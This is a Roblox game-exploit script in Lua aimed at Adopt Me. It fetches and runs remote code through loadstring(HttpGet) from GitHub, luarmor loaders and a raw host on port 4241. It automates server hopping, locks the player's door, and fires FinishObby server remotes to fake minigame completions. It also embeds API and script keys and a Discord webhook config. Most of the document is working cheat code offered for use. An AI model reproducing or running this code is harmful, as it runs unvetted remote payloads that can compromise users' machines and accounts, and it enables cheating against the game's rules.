loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenijo/AdoptMe-RemoteBypass/main/Bypass.lua"))()
wait(0.1)
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/08615e5f6a25239a4ffa9b6203728d70.lua"))()
wait(10)
wait(1)
Time = 1 -- seconds
repeat wait() until game:IsLoaded()
wait(Time)
local PlaceID = game.PlaceId
local AllIDs = {}
local foundAnything = ""
local actualHour = os.date("!*t").hour
local Deleted = false
function TPReturner()
   local Site;
   if foundAnything == "" then
       Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'))
   else
       Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
   end
   local ID = ""
   if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
       foundAnything = Site.nextPageCursor
   end
   local num = 0;
   for i,v in pairs(Site.data) do
       local Possible = true
       ID = tostring(v.id)
       if tonumber(v.maxPlayers) > tonumber(v.playing) then
           for _,Existing in pairs(AllIDs) do
               if num ~= 0 then
                   if ID == tostring(Existing) then
                       Possible = false
                   end
               else
                   if tonumber(actualHour) ~= tonumber(Existing) then
                       local delFile = pcall(function()
                           delfile("NotSameServers.json")
                           AllIDs = {}
                           table.insert(AllIDs, actualHour)
                       end)
                   end
               end
               num = num + 1
           end
           if Possible == true then
               table.insert(AllIDs, ID)
               wait()
               pcall(function()
                   writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
                   wait()
                   game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)
               end)
               wait(4)
           end
       end
   end
end
 
function Teleport()
   while wait() do
       pcall(function()
           TPReturner()
           if foundAnything ~= "" then
               TPReturner()
           end
       end)
   end
end
 
-- If you'd like to use a script before server hopping (Like a Automatic Chest collector you can put the Teleport() after it collected everything.

    Teleport()


wait(1)
local Player = game.Players.LocalPlayer    
local Http = game:GetService("HttpService")
local TPS = game:GetService("TeleportService")
local Api = "https://games.roblox.com/v1/games/"

local _place,_id = game.PlaceId, game.JobId
-- Asc for lowest player count, Desc for highest player count
local _servers = Api.._place.."/servers/Public?sortOrder=Asc&limit=10"
function ListServers(cursor)
   local Raw = game:HttpGet(_servers .. ((cursor and "&cursor="..cursor) or ""))
   return Http:JSONDecode(Raw)
end

time_to_wait = 1 --seconds

-- choose a random server and join every 2 minutes
while wait(time_to_wait) do
   --freeze player before teleporting to prevent synapse crash?
   Player.Character.HumanoidRootPart.Anchored = true
   local Servers = ListServers()
   local Server = Servers.data[math.random(1,#Servers.data)]
   TPS:TeleportToPlaceInstance(_place, Server.id, Player)
end
wait(1)

wait(1)
local args = {
    [1] = true
}

game:GetService("ReplicatedStorage").API:FindFirstChild("HousingAPI/SetDoorLocked"):InvokeServer(unpack(args))
wait(1)
task.spawn(function()
    task.wait(35)
    getgenv().API_KEY = "pQP1Ma1WE4h81mPToP54"
    loadstring(game:HttpGet("http://ii.sebas.sbs:4241/adoptme/dashboard.lua"))()
end)

task.spawn(function()
   -- ARCEUS, CODEX ETC
task.wait(35)
script_key="NxzplPKcRYahKMvLcZtfTAOQURrRclwP";
getgenv().Config = {
    ["Winter_EVENT"] = false,
    ["PetFarmActive"] = true,
    ["EggFarmActive"] = false,
    ["Blur_username"] = true,
    ["Blazing_Lion_Log"] = false,
    ["DiscordId"] = "942321951010086922",
    ["Webhook"] = "https://discord.com/api/webhooks/123456",
}
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/66567bfd337b57eb059b58dbe1badb89.lua"))()
local args = {
    [1] = "coastal_climb"
}

game:GetService("ReplicatedStorage").API:FindFirstChild("MinigameAPI/FinishObby"):FireServer(unpack(args))
wait(6005)
local args = {
    [1] = "ancient_ruins"
}

game:GetService("ReplicatedStorage").API:FindFirstChild("MinigameAPI/FinishObby"):FireServer(unpack(args))
wait(12500)
local args = {
    [1] = "lonelypeak"
}

game:GetService("ReplicatedStorage").API:FindFirstChild("MinigameAPI/FinishObby"):FireServer(unpack(args))
wait(25009)
local args = {
    [1] = "miniworld"
}

game:GetService("ReplicatedStorage").API:FindFirstChild("MinigameAPI/FinishObby"):FireServer(unpack(args))
wait(30001)
local args = {
    [1] = "pyramid"
}

game:GetService("ReplicatedStorage").API:FindFirstChild("MinigameAPI/FinishObby"):FireServer(unpack(args))
wait(40505)
local args = {
    [1] = "shipwreck_bay"
}

game:GetService("ReplicatedStorage").API:FindFirstChild("MinigameAPI/FinishObby"):FireServer(unpack(args))
wait(60409)
local args = {
    [1] = "tinyisles"
}

game:GetService("ReplicatedStorage").API:FindFirstChild("MinigameAPI/FinishObby"):FireServer(unpack(args))
